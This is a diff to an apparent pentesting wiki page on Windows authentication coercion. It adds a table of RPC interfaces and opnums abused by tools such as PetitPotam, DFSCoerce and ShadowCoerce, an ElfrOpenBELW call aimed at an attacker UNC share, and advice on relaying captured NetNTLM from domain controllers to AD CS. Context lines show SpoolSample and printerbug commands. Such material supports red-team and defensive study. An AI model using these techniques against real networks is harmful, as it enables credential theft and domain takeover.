@@ -36,7 +36,7 @@ rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 
 ### Ask the service to authenticate against an arbitrary host
 
-You can compile[ **SpoolSample from here**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
+You can compile [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket).
 
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
@@ -53,12 +53,48 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 
 If an attacker has already compromised a computer with [Unconstrained Delegation](unconstrained-delegation.md), the attacker could **make the printer authenticate against this computer**. Due to the unconstrained delegation, the **TGT** of the **computer account of the printer** will be **saved in** the **memory** of the computer with unconstrained delegation. As the attacker has already compromised this host, he will be able to **retrieve this ticket** and abuse it ([Pass the Ticket](pass-the-ticket.md)).
 
-## RCP Force authentication
+## RPC Force authentication
 
+[Coercer](https://github.com/p0dalirius/Coercer)
 
-{{#ref}}
-https://github.com/p0dalirius/Coercer
-{{#endref}}
+### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
+- MS-RPRN (Print System Remote Protocol)
+  - Pipe: \\PIPE\\spoolss
+  - IF UUID: 12345678-1234-abcd-ef00-0123456789ab
+  - Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
+  - Tools: PrinterBug / PrintNightmare-family
+- MS-PAR (Print System Asynchronous Remote)
+  - Pipe: \\PIPE\\spoolss
+  - IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
+  - Opnum: 0 RpcAsyncOpenPrinter
+- MS-EFSR (Encrypting File System Remote Protocol)
+  - Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
+  - IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
+  - Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
+  - Tool: PetitPotam
+- MS-DFSNM (DFS Namespace Management)
+  - Pipe: \\PIPE\\netdfs
+  - IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
+  - Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
+  - Tool: DFSCoerce
+- MS-FSRVP (File Server Remote VSS)
+  - Pipe: \\PIPE\\FssagentRpc
+  - IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
+  - Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
+  - Tool: ShadowCoerce
+- MS-EVEN (EventLog Remoting)
+  - Pipe: \\PIPE\\even
+  - IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
+  - Opnum: 9 ElfrOpenBELW
+  - Tool: CheeseOunce
+
+Note: These methods accept parameters that can carry a UNC path (e.g., `\\attacker\share`). When processed, Windows will authenticate (machine/user context) to that UNC, enabling NetNTLM capture or relay.
+
+### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
+- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
+- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
+- Effect: the target attempts to open the supplied backup log path and authenticates to the attacker-controlled UNC.
+- Practical use: coerce Tier 0 assets (DC/RODC/Citrix/etc.) to emit NetNTLM, then relay to AD CS endpoints (ESC8/ESC11 scenarios) or other privileged services.
 
 ## PrivExchange
 
@@ -136,5 +172,14 @@ If you can perform a MitM attack to a computer and inject HTML in a page he will
 
 If you can capture [NTLMv1 challenges read here how to crack them](../ntlm/index.html#ntlmv1-attack).\
 _Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"_
+
+## References
+- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
+- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
+- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
+- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
+- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
+- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
+- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
 
 {{#include ../../banners/hacktricks-training.md}}
